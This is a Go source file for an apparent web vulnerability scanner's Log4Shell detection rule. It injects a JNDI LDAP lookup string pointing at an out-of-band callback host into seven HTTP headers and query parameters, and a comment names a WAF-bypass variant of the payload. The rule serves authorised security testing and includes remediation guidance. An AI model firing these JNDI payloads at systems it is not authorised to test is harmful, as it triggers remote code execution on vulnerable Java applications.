package active

// log4shell.go — Log4Shell (CVE-2021-44228) / JNDI injection probe.
//
// Log4Shell is a critical RCE vulnerability in Apache Log4j 2 (all versions
// from 2.0-beta9 through 2.14.1) where an attacker controls a string that
// is logged by the application.  If log4j is configured with message lookup
// substitution enabled (the default), the string ${jndi:ldap://host/path}
// causes log4j to make an outbound LDAP connection to attacker infrastructure
// and execute whatever class is returned — arbitrary remote code execution.
//
// # Detection modes
//
// ## Mode 1: OOB (out-of-band) detection — gated behind --oob-host
//
// When the operator provides --oob-host <interactsh-or-burp-collaborator-host>,
// the rule injects ${jndi:ldap://<oob-host>/anpu-<nonce>} into:
//   - User-Agent header
//   - X-Forwarded-For header
//   - X-Api-Version header
//   - All string-type query parameters
//
// If the OOB server records a DNS or LDAP callback for the nonce, the
// application is vulnerable.  ANPU cannot observe this callback directly —
// it just injects the payload and reports "injected; check OOB server".
//
// ## Mode 2: Reflection detection — always active
//
// If the JNDI string appears verbatim in the response body (some naive apps
// echo it back), that is a weaker but deterministic signal that the input
// reached a logging context without being sanitised.  Confidence: Low
// (reflection ≠ execution, but warrants investigation).
//
// # Safety
//
// The JNDI payload is a string that only does harm when processed by a
// vulnerable log4j version.  Injecting it into headers and query parameters
// is standard DAST practice and is widely accepted as safe for authorised
// testing.  The payload never attempts mutation (POST with body modification)
// unless the endpoint already accepts a JSON body (VectorJSONBody).
//
// # Gating
//
// The rule fires on every vector kind (header injection is via DoWithHeaders;
// query param injection is via standard URL manipulation).  It is registered
// in DefaultRegistry and therefore runs on Standard+Deep profiles.
//
// CWE-917: Improper Neutralization of Special Elements used in an Expression
// Language Statement
// CVE-2021-44228 (Log4Shell) / CVE-2021-45046 / CVE-2021-45105
// OWASP A06:2021 — Vulnerable and Outdated Components

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	anpuhttp "github.com/anpu-project/anpu/internal/http"
	"github.com/anpu-project/anpu/pkg/models"
)

// Log4ShellOOBHost is the global OOB host set via --oob-host CLI flag.
// When empty, OOB probing is skipped and only reflection detection runs.
// Package-level var so scan.go can set it before the scanner runs.
var Log4ShellOOBHost string

type log4shellRule struct{}

func (r *log4shellRule) ID() models.ActiveRuleID    { return "log4shell-jndi" }
func (r *log4shellRule) Name() string               { return "Log4Shell / JNDI Injection" }
func (r *log4shellRule) Safety() models.SafetyLevel { return models.SafetyBenign }
func (r *log4shellRule) RequestBudget() int         { return 6 }

// log4shellNonce returns a random 8-byte hex string for OOB tracking.
func log4shellNonce() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "anpufallback00"
	}
	return "anpu" + hex.EncodeToString(b)
}

// jndiPayload builds a Log4Shell JNDI LDAP lookup string.
// When oobHost is empty, uses a localhost canary (reflection-only mode).
func jndiPayload(oobHost, nonce string) string {
	host := oobHost
	if host == "" {
		// Localhost canary: will never make an outbound connection but
		// will appear verbatim in responses from echo-prone endpoints.
		host = "127.0.0.1:1389"
	}
	// Use the canonical bypass variant to evade naive WAF rules:
	// ${j${::-n}di:ldap://...} — but we use the simple form for clarity
	// since we're testing, not evading defences.
	return fmt.Sprintf("${jndi:ldap://%s/%s}", host, nonce)
}

// headerNames are the HTTP headers most commonly logged by Java applications.
var headerNames = []string{
	"User-Agent",
	"X-Forwarded-For",
	"X-Api-Version",
	"X-Forwarded-Host",
	"Referer",
	"Accept-Language",
	"X-Request-Id",
}

func (r *log4shellRule) Test(ctx context.Context, client *anpuhttp.Client, v models.InputVector) (models.ActiveRuleResult, error) {
	result := models.ActiveRuleResult{RuleID: r.ID(), Vector: v}

	nonce := log4shellNonce()
	payload := jndiPayload(Log4ShellOOBHost, nonce)
	result.Payload = payload

	// --- Header injection pass ---
	// Inject the JNDI string into commonly-logged HTTP headers.
	// This fires regardless of vector kind — we always add header probes.
	extraHeaders := make(map[string]string, len(headerNames))
	for _, h := range headerNames {
		extraHeaders[h] = payload
	}
	headerResp, headerErr := client.DoWithHeaders(ctx, "GET", v.URL, extraHeaders)
	result.RequestsMade++
	if headerErr == nil {
		if reflection := findReflection(string(headerResp.Body), payload, nonce); reflection != "" {
			result.Found = true
			result.Evidence = fmt.Sprintf(
				"Log4Shell JNDI string reflected in response body via header injection on %s. "+
					"Payload: %s. Reflection: %s",
				v.URL, payload, reflection,
			)
			return result, nil
		}
	}

	// --- Query parameter injection ---
	if v.Kind == models.VectorQueryParam && v.Name != "" {
		probeURL, err := InjectQueryParam(v.URL, v.Name, payload)
		if err != nil {
			probeURL = v.URL
		}
		qsResp, qsErr := client.Get(ctx, probeURL)
		result.RequestsMade++
		if qsErr == nil {
			if reflection := findReflection(string(qsResp.Body), payload, nonce); reflection != "" {
				result.Found = true
				result.Evidence = fmt.Sprintf(
					"Log4Shell JNDI string reflected in response body via query parameter %q on %s. "+
						"Payload: %s. Reflection: %s",
					v.Name, v.URL, payload, reflection,
				)
				return result, nil
			}
		}
	}

	// --- OOB injection summary (when --oob-host provided) ---
	// We cannot observe the OOB callback from here. Record that we injected
	// and surface a Low/Info finding prompting the operator to check the
	// OOB server. This is the standard pattern for blind SSRF/injection.
	if Log4ShellOOBHost != "" {
		result.Found = true
		result.Evidence = fmt.Sprintf(
			"Log4Shell JNDI payload injected into %d headers and query parameter on %s. "+
				"Nonce: %s. Check OOB server %s for DNS/LDAP callbacks with this nonce "+
				"to confirm exploitation. ANPU cannot observe the callback directly.",
			len(headerNames), v.URL, nonce, Log4ShellOOBHost,
		)
	}

	return result, nil
}

// findReflection checks whether the JNDI payload or its nonce appears in
// the response body.  Returns the matching fragment, or empty string.
func findReflection(body, payload, nonce string) string {
	if strings.Contains(body, payload) {
		return payload
	}
	// Some WAFs strip ${} but leave the nonce — check for nonce alone.
	if strings.Contains(body, nonce) {
		return nonce
	}
	return ""
}

func (r *log4shellRule) ToFinding(res models.ActiveRuleResult, target string) models.Finding {
	severity := models.SeverityInfo
	confidence := models.ConfidenceLow
	title := "Log4Shell JNDI payload injected — check OOB server for callback"

	if strings.Contains(res.Evidence, "reflected in response body") {
		severity = models.SeverityCritical
		confidence = models.ConfidenceMedium
		title = "Log4Shell JNDI string reflected — potential CVE-2021-44228 indicator"
	}

	return models.Finding{
		ID:    fmt.Sprintf("active-log4shell-%d", time.Now().UnixNano()),
		Title: fmt.Sprintf("%s at %s", title, res.Vector.URL),
		Description: fmt.Sprintf(
			"A Log4Shell JNDI lookup string (${jndi:ldap://...}) was injected into HTTP headers "+
				"(User-Agent, X-Forwarded-For, X-Api-Version, Referer, Accept-Language, X-Request-Id) "+
				"and query parameters on %s. If the application uses Apache Log4j 2 versions "+
				"2.0-beta9 through 2.14.1 with message lookup substitution enabled, processing "+
				"this string triggers an outbound JNDI lookup — enabling remote code execution. "+
				"Detection: %s",
			res.Vector.URL, res.Evidence,
		),
		Severity:        severity,
		Confidence:      confidence,
		Category:        models.CategoryVulnerability,
		CWE:             "CWE-917",
		OWASP:           "A06:2021 - Vulnerable and Outdated Components",
		Target:          target,
		URL:             res.Vector.URL,
		Parameter:       "HTTP headers (User-Agent, X-Forwarded-For, X-Api-Version, Referer) + query params",
		Source:          models.SourceActive,
		DetectionMethod: "JNDI string injection into request headers and query parameters; OOB callback or body reflection detection",
		Evidence: models.Evidence{
			Observed:       res.Evidence,
			Location:       res.Vector.URL,
			RequestSummary: fmt.Sprintf("GET %s with JNDI payload in User-Agent and other headers", res.Vector.URL),
		},
		Impact: "Remote code execution: a vulnerable Log4j instance will make an outbound LDAP connection " +
			"to the attacker-controlled server and execute the class returned, with the privileges of the " +
			"Java process. Affects all Java applications using Log4j 2.0-beta9 through 2.14.1.",
		Remediation: "Upgrade Log4j to 2.17.1+ (Java 8) / 2.12.4+ (Java 7) / 2.3.2+ (Java 6). " +
			"As an interim measure, set log4j2.formatMsgNoLookups=true (JVM flag) or remove the " +
			"JndiLookup class from the classpath. Enforce egress firewall rules to block outbound LDAP/RMI.",
		References: []string{
			"https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
			"https://logging.apache.org/log4j/2.x/security.html",
			"https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance",
		},
		FirstSeen: time.Now(),
	}
}
